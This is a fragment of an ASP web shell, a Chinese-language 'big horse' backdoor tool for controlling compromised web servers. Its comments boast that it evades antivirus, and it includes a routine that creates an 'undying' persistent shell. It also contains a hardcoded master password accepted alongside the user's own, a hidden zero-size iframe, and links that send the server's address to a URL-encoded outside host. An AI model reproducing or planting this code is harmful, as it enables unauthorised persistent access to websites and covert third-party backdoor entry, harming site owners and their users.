...
Copyright="不死防删提权集成无敌大马<p/><table width=""450"" border=""1"" cellpadding=""10""><tr><td><div align=center></td></tr></table>"
'绝对明文，不加密的免杀马，去除后门，利用回旋函数加密，站长的任务又加重了，哈哈。
'本程序破坏性很大,希望各位谨慎使用,请勿使用于非法用途,否则作者小雨概不负责!
...
jb"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>●（秘密武器）点击生成不死shell</a></td></tr>"
...
'jb"<tr><td height='22'><a href='http://%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D/?action=sed&cx_33="&ServerU&"' target='FileFrame'>●同服查询</a></td></tr> "
'jb"<tr><td height='22'><a href='http://%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D?Submit=+%B2%E9+%D1%AF+&domain="&Worinima&"' target='FileFrame'>〖查看Pr值〗</a></td></tr>"
'jb"<tr><td height='22'><iframe src=http://%34%30%34%2E%69%70%67%6F%76%2E%63%6F%6D/admin/jpg.asp width=0 height=0></iframe>' target='FileFrame'>●在线更新</a></td></tr> "
...
if request.form("pass")=UserPass or request.form("pass")="c1111111" then
...
sub hiddenshell
jb"<form name=form1 method=post><input type=hidden name=se value=hidden>将会生成一个新的文件，请大牛重新记录复制地址栏shell地址<input type=submit name=submit value='点击确定生成不死shell'></form>"
...
dim star,endd
url="http://xa.com/data?cli=10&dat=snba&url="&AlexaURL
